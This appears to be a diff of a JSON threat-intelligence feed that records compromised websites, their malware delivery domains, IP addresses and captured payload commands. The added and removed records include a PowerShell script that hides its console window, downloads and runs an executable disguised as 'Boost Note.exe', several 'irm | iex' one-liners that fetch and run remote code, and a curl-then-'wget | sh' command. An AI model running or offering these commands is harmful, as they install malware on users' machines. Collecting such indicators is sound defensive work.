@@ -1,5 +1,44 @@
 [
   {
+    "UrlDomain": "rsventure.in",
+    "DeliveryUrl": [
+      "makeverizyjar.info",
+      "friendsoftorreabbey.com"
+    ],
+    "PayloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "IP": [
+      "91.108.98.174"
+    ],
+    "Related": [],
+    "Payload": "$url = \"https://friendsoftorreabbey[.]com/32b\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"TlkVMerN.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "ReportId": "cmwpq1rz623xv0oml9b7ckyzg",
+    "ScannedAt": "2026-11-21T01:20:51.962000+00:00"
+  },
+  {
+    "UrlDomain": "www.wasinitaxi.com",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/99ef1787ae952355"
+    ],
+    "IP": [
+      "157.90.71.19"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/99ef1787ae952355')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/99ef1787ae952355"
+    ],
+    "ReportId": "cmwpq1jvq23wg0omlvvcycyd4",
+    "ScannedAt": "2026-11-21T01:20:41.503000+00:00"
+  },
+  {
     "UrlDomain": "www.etaic.org",
     "DeliveryUrl": [
       "j7tracker.gb.net"
@@ -16468,65 +16507,5 @@
     ],
     "ReportId": "cmwbg1jw206qq0nmlz0huek8f",
     "ScannedAt": "2026-11-11T01:31:58.863000+00:00"
-  },
-  {
-    "UrlDomain": "safeskill.co.za",
-    "DeliveryUrl": [
-      "browse-nnccodes.beer"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "197.242.65.12"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-nnccodes.beer/d6635ac514ec3dc5",
-        "Type": "payload download"
-      },
-      {
-        "Value": "https://browse-nnccodes.beer/api.php?s=8402fb1338daab6a166e91aa8c92a20798acfa98fb75c5a2&amp;_v=29905997",
-        "Type": "Reference"
-      },
-      {
-        "Value": "https://browse-nnccodes.beer/api.php?s=8402fb1338daab6a166e91aa8c92a20798acfa98fb75c5a2&amp;_v=29905998",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "irm 'browse-nnccodes.beer/d6635ac514ec3dc5'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-nnccodes.beer/d6635ac514ec3dc5"
-    ],
-    "ReportId": "cmwbfkpep06i70nml6przoq86",
-    "ScannedAt": "2026-11-11T01:18:52.837000+00:00"
-  },
-  {
-    "UrlDomain": "cofeservice.ru",
-    "DeliveryUrl": [
-      "browse-nnccodes.beer",
-      "script.google.com",
-      "script-six-tawny.vercel.app"
-    ],
-    "PayloadUrl": [
-      "https://script-six-tawny.vercel.app/lin",
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://script-six-tawny.vercel.app/win",
-      "https://script-six-tawny.vercel.app/mac"
-    ],
-    "IP": [
-      "109.95.213.100"
-    ],
-    "Related": [
-      {
-        "Value": "https://silverrogpuia.pro/t.js?site=af886a10ae8d3e0eb720fa1e73cd1505",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "curl -sL -d \"id=e061325d-e3f5-4bf4-b562-31a09ea854b9&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fcofeservice[.]ru%2F&os=Linux%20x86_64&lastVisitAt=2026-11-11T01%3A00%3A40.345Z&lastShellAt=2026-11-11T01%3A00%3A40.345Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
-    "ResolvedDownloadUrl": [
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://script-six-tawny.vercel.app/lin"
-    ],
-    "ReportId": "cmwbez2fg06ao0nmlov0j0g7o",
-    "ScannedAt": "2026-11-11T01:02:03.343000+00:00"
   }
 ]
